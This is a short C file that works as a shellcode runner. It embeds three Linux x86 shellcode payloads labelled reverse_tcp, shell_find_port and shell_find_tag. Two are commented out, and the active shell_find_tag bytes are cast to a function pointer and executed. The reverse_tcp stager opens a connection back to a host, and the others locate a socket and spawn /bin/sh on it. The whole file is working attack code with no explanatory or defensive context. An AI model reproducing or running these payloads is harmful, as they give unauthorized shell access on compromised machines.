#include<stdio.h>
#include<string.h>

// linux/x86/shell/reverse_tcp
/*
unsigned char payload[] = \
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
"\xe1\xcd\x80\x97\x5b\x68\x7f\x00\x00\x01\x68\x02\x00\x05\x39"
"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80"
"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
"\x00\xcd\x80";
*/

// linux/x86/shell_find_port
/*
unsigned char payload[] = \
"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"
"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x05\x39\x75\xf1\x5b"
"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80";
*/

// linux/x86/shell_find_tag
unsigned char payload[] = \
"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"
"\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x53\x4c\x41\x45"
"\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79"
"\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80";

int main()
{

	printf("Payload Length:  %d\n", strlen(payload));

	int (*ret)() = (int(*)())payload;

	ret();

}

	
